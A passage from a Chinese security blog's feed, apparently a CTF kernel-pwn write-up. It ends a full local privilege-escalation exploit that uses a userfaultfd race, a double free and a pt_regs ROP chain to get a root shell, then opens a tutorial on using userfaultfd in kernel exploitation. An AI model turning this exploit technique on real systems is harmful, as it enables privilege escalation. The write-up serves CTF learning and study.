<span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">    ur.range.len = len;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">leak_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler created&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler unblocked&quot;</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">delete</span> (&amp;kernel_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]leak ptr:%p\n&quot;</span>, kernel_addr);</span><br><span class="line">    kernel_base = kernel_addr - <span class="number">0x186f78</span>;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">    uc.len = <span class="number">0x1000</span>;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">double_free_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] double free handler created&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] double free handler unblocked&quot;</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">char</span> *tmp = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">delete</span> (tmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">    uc.len = <span class="number">0x1000</span>;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] double free handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mov_rdi_rax_pop_rbp_ret;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">getroot_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] getroot handler created&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] getroot handler unblocked&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] setxattr trapped in userfaultfd.&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">        close(seq_fd_reserve[i]);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    pop_rdi = <span class="number">0xffffffff81034505</span> + kernel_offset;</span><br><span class="line">    commit_creds = <span class="number">0xffffffff81069c10</span> + kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81600a34</span> + kernel_offset + <span class="number">0x10</span>;</span><br><span class="line">    prepare_kernel_cred = <span class="number">0xffffffff81069e00</span> + kernel_offset;</span><br><span class="line">    mov_rdi_rax_pop_rbp_ret = <span class="number">0xffffffff8121f89a</span> + kernel_offset;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   pop_rdi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   prepare_kernel_cred\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   mov_rdi_rax_pop_rbp_ret\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   commit_creds\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    swapgs_restore_regs_and_return_to_usermode\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd\n&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] execve root shell now...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">    uc.len = <span class="number">0x1000</span>;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] getroot handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/proc/stack&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Error opening /proc/stack\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *leak_buf;</span><br><span class="line">    <span class="keyword">int</span> shm_id;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *shm_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *double_free_buf;</span><br><span class="line">    <span class="keyword">char</span> *getroot_buf;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd_reserve[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            ErrExit(<span class="string">&quot;seq reserve!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    leak_buf = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(leak_buf, <span class="number">0x1000</span>, leak_handler);</span><br><span class="line">    shm_id = shmget(<span class="number">114514</span>, <span class="number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;shmget!&quot;</span>);</span><br><span class="line">    shm_addr = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (shm_addr &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;shmat!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (shmdt(shm_addr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line">    create(leak_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]kernel_base=&gt;%p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]kernel_offset=&gt;%p\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    double_free_buf = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(double_free_buf, <span class="number">0x1000</span>, double_free_handler);</span><br><span class="line">    create(<span class="string">&quot;196082&quot;</span>);</span><br><span class="line">    <span class="keyword">delete</span> (double_free_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] double free\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    getroot_buf = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(getroot_buf + <span class="number">0x1000</span>, <span class="number">0x1000</span>, getroot_handler);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(getroot_buf + <span class="number">0x1000</span> - <span class="number">8</span>) = <span class="number">0xffffffff814d51c0</span> + kernel_offset;</span><br><span class="line">    <span class="comment">// // add rsp , 0x1c8 ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15; pop rbp ; ret</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gadget=&gt;%p\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(getroot_buf + <span class="number">0x1000</span> - <span class="number">8</span>));</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;196082&quot;</span>, getroot_buf + <span class="number">0x1000</span> - <span class="number">8</span>, <span class="number">32</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220906195313852.png"                      alt="image-20220906195313852"                ></p><p>题目放在：<a class="link"   href="https://github.com/196082/196082/tree/main/kernel_pwn" >https://github.com/196082/196082/tree/main/kernel_pwn<i class="fas fa-external-link-alt"></i></a></p><hr><p>参考链接：<a class="link"   href="https://www.anquanke.com/post/id/266898#h3-5" >https://www.anquanke.com/post/id/266898#h3-5<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;关于userfaultfd这里就不再提及了，不熟悉的可以看一下上一篇文章 &lt;a href=&quot;https://cv196082.gitee.io/2022/08/16/userfaultfd/&quot;&gt;https://cv196082.gitee.io/2022/08/16/use</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="userfaultfd" scheme="https://cv196082.gitee.io/tags/userfaultfd/"/>
    
    <category term="setxattr" scheme="https://cv196082.gitee.io/tags/setxattr/"/>
    
    <category term="pt_regs" scheme="https://cv196082.gitee.io/tags/pt-regs/"/>
    
  </entry>
  
  <entry>
    <title>userfaultfd利用</title>
    <link href="https://cv196082.gitee.io/2022/08/16/userfaultfd/"/>
    <id>https://cv196082.gitee.io/2022/08/16/userfaultfd/</id>
    <published>2022-08-16T10:11:10.000Z</published>
    <updated>2022-08-16T10:11:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实这应该是kernelpwn基础中的一个，但是一直没有很关心，在最近做一道题目时又提到了这一利用方式，索性就把这玩意给先写了。</p><h3 id="简单理解"><a href="#简单理解" class="headerlink" title="简单理解"></a>简单理解</h3><p>userfaultfd 并不是一种攻击的名字，它是 Linux 提供的一种让用户自己处理缺页异常的机制，初衷是为了提升开发灵活性，在 kernel pwn 中常被用于提高条件竞争的成功率。比如在如下的操作时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_from_user(kptr, user_buf, size);</span><br></pre></td></tr></table></figure><p>如果在进入函数后，实际拷贝开始前线程被中断换下 CPU，别的线程执行，修改了 kptr 指向的内存块的所有权（比如 kfree 掉了这个内存块），然后再执行拷贝时就可以实现 UAF。这种可能性当然是比较小的，但是如果 user_buf 是一个 mmap 的内存块，并且我们为它注册了 userfaultfd，那么在拷贝时出现缺页异常后此线程会先执行我们注册的处理函数，在处理函数结束前线程一直被暂停，结束后才会执行后面的操作，大大增加了竞争的成功率。</p><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h3 id="页调度与延迟加载"><a href="#页调度与延迟加载" class="headerlink" title="页调度与延迟加载"></a>页调度与延迟加载</h3><p>有的内存既不在RAM也不在交换区，例如mmap创建的内存映射页。mmap页在read/write访问之前，实际上还没有创建（还没有映射到实际的物理页），例如：<code>mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE, fd, 0);</code> 内核并未将fd内容拷贝到0x1337000，只是将地址0x1337000映射到文件fd。</p><p>当有如下代码访问时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *a = (<span class="keyword">char</span> *)<span class="number">0x1337000</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;content: %c\n&quot;</span>, a[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>若发生对该页的引用，则（1）为0x1337000创建物理帧，（2）从fd读内容到0x1337000，（3）并在页表标记合适的入口，以便识别0x1337000虚地址。如果是堆空间映射，仅第2步不同，只需将对应物理帧清0。</p><p>总之，若首次访问mmap创建的页，会耗时很长，会导致上下文切换和当前线程的睡眠。</p><h2 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h2><p>我对于他的理解就是，userfaultfd机制是用来处理页缺陷的，并且处理的handle函数我们也是可以控制的。正常的流程一般为下面几步。</p><h3 id="Step-1-创建一个描述符uffd"><a href="#Step-1-创建一个描述符uffd" class="headerlink" title="Step 1: 创建一个描述符uffd"></a>Step 1: 创建一个描述符uffd</h3><p>所有的注册内存区间、配置和最终的缺页处理等就都需要用ioctl来对这个uffd操作。ioctl-userfaultfd支持UFFDIO_API、UFFDIO_REGISTER、UFFDIO_UNREGISTER、UFFDIO_COPY、UFFDIO_ZEROPAGE、UFFDIO_WAKE等选项。比如UFFDIO_REGISTER用来向userfaultfd机制注册一个监视区域，这个区域发生缺页时，需要用UFFDIO_COPY来向缺页的地址拷贝自定义数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">2</span> 个用于注册、注销的ioctl选项：</span><br><span class="line">UFFDIO_REGISTER                 注册将触发user-fault的内存地址</span><br><span class="line">UFFDIO_UNREGISTER               注销将触发user-fault的内存地址</span><br><span class="line"># <span class="number">3</span> 个用于处理user-fault事件的ioctl选项：</span><br><span class="line">UFFDIO_COPY                     用已知数据填充user-fault页</span><br><span class="line">UFFDIO_ZEROPAGE                 将user-fault页填零</span><br><span class="line">UFFDIO_WAKE                     用于配合上面两项中 UFFDIO_COPY_MODE_DONTWAKE 和</span><br><span class="line">                                UFFDIO_ZEROPAGE_MODE_DONTWAKE模式实现批量填充  </span><br><span class="line"># <span class="number">1</span> 个用于配置uffd特殊用途的ioctl选项：</span><br><span class="line">UFFDIO_API                      它又包括如下feature可以配置：</span><br><span class="line">                                UFFD_FEATURE_EVENT_FORK         (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_EVENT_REMAP        (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_EVENT_REMOVE       (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_EVENT_UNMAP        (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_MISSING_HUGETLBFS  (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_MISSING_SHMEM      (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_SIGBUS             (since Linux <span class="number">4.14</span>)</span><br><span class="line"><span class="comment">// userfaultfd系统调用创建并返回一个uffd，类似一个文件的fd</span></span><br><span class="line">uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br></pre></td></tr></table></figure><h3 id="STEP-2-用ioctl的UFFDIO-REGISTER选项注册监视区域"><a href="#STEP-2-用ioctl的UFFDIO-REGISTER选项注册监视区域" class="headerlink" title="STEP 2. 用ioctl的UFFDIO_REGISTER选项注册监视区域"></a>STEP 2. 用ioctl的UFFDIO_REGISTER选项注册监视区域</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册时要用一个struct uffdio_register结构传递注册信息:</span></span><br><span class="line"><span class="comment">// struct uffdio_range &#123;</span></span><br><span class="line"><span class="comment">// __u64 start;    /* Start of range */</span></span><br><span class="line"><span class="comment">// __u64 len;      /* Length of range (bytes) */</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// struct uffdio_register &#123;</span></span><br><span class="line"><span class="comment">// struct uffdio_range range;</span></span><br><span class="line"><span class="comment">// __u64 mode;     /* Desired mode of operation (input) */</span></span><br><span class="line"><span class="comment">// __u64 ioctls;   /* Available ioctl() operations (output) */</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line">addr = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>)</span><br><span class="line"><span class="comment">// addr 和 len 分别是我匿名映射返回的地址和长度，赋值到uffdio_register</span></span><br><span class="line">uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">uffdio_register.range.len = len;</span><br><span class="line"><span class="comment">// mode 只支持 UFFDIO_REGISTER_MODE_MISSING</span></span><br><span class="line">uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line"><span class="comment">// 用ioctl的UFFDIO_REGISTER注册</span></span><br><span class="line">ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register);</span><br></pre></td></tr></table></figure><h3 id="STEP-3-创建一个处理专用的线程轮询和处理”user-fault”事件"><a href="#STEP-3-创建一个处理专用的线程轮询和处理”user-fault”事件" class="headerlink" title="STEP 3. 创建一个处理专用的线程轮询和处理”user-fault”事件"></a>STEP 3. 创建一个处理专用的线程轮询和处理”user-fault”事件</h3><p>要使用userfaultfd，需要创建一个处理专用的线程轮询和处理”user-fault”事件。主进程中就要调用pthread_create创建这个自定义的handler线程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 主进程中调用pthread_create创建一个fault handler线程</span></span><br><span class="line">pthread_create(&amp;thr, <span class="literal">NULL</span>, fault_handler_thread, (<span class="keyword">void</span> *) uffd);</span><br></pre></td></tr></table></figure><p>一个自定义的线程函数举例如下，这里处理的是一个普通的匿名页用户态缺页，我们要做的是把我们一个已有的一个page大小的buffer内容拷贝到缺页的内存地址处。用到了poll函数轮询uffd，并对轮询到的UFFD_EVENT_PAGEFAULT事件(event)用拷贝(ioctl的UFFDIO_COPY选项)进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 